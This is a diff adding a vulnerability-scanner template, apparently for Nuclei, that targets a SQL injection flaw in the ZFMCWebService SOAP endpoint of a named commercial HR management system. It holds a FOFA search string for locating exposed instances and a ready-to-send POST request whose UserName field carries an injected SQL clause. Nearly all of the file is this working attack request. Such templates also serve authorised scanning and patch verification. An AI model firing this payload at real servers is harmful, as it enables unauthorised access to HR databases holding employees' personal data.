@@ -1,0 +1,19 @@
+id: poc-nl8c01tt6a437pyc
+info:
+  name: 朗新天霁人力资源管理系统ZFMCWebService存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nl8c01tt6a437pyc'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nl8c01tt6a437pyc
+    fofa: product="HRSOFT-人力资源管理系统"
+http:
+- raw:
+  - "POST /ws/ZFMCWs/ZFMCWebService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"http://tempuri.org/UserInfo\"\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\n\n<?xml version=\"1.0\" encoding=\"utf-8\" ?>\n<soap:Envelope\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\n  xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\n>\n <soap:Body>\n  <UserInfo xmlns=\"http://tempuri.org/\">\n   <UserName>') AND 1004 IN (SELECT (SELECT CASE WHEN 1004=1004 THEN 'sxsdvddqwe' ELSE 'sxsdvddqwe' END))-- OOxB</UserName>\n   <DeptName>rt</DeptName>\n  </UserInfo>\n </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
